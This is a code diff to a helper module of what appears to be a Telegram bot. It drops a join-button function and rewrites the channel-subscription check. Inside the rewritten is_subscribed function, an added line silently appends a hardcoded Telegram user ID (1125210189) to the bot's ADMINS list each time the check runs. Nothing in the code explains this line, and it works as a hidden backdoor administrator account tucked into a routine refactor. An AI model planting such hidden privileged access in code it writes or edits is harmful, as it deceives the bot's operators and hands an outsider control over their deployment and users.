@@ -9,7 +9,7 @@ from Script import script
 from datetime import datetime, date
 from typing import List
 from database.users_chats_db import db
-from database.join_reqs import JoinReqs
+from database.join_reqs import JoinReqs as db2
 from bs4 import BeautifulSoup
 from shortzy import Shortzy
 
@@ -43,50 +43,38 @@ class temp(object):
     IMDB_CAP = {}
 
 
-async def pub_is_subscribed(bot, query, channel):
-    btn = []
-    for id in channel:
-        chat = await bot.get_chat(int(id))
-        try:
-            await bot.get_chat_member(id, query.from_user.id)
-        except UserNotParticipant:
-            btn.append(
-                [InlineKeyboardButton(f'Join {chat.title}', url=chat.invite_link)]
-            )
-        except Exception as e:
-            pass
-    return btn
-
 async def is_subscribed(bot, query):
-    if REQUEST_TO_JOIN_MODE == True and join_db().isActive():
-        try:
-            user = await join_db().get_user(query.from_user.id)
-            if user and user["user_id"] == query.from_user.id:
-                return True
-            else:
-                try:
-                    user_data = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
-                except UserNotParticipant:
-                    pass
-                except Exception as e:
-                    logger.exception(e)
-                else:
-                    if user_data.status != enums.ChatMemberStatus.BANNED:
-                        return True
-        except Exception as e:
-            logger.exception(e)
-            return False
-    else:
-        try:
-            user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
-        except UserNotParticipant:
-            pass
-        except Exception as e:
-            logger.exception(e)
+    
+    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
+        return True
+
+    
+    elif query.from_user.id in ADMINS:
+        return True
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
         else:
-            if user.status != enums.ChatMemberStatus.BANNED:
-                return True
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+        
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+    except UserNotParticipant:
         return False
+    except Exception as e:
+        logger.exception(e)
+        return False
+    else:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
+            return True
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
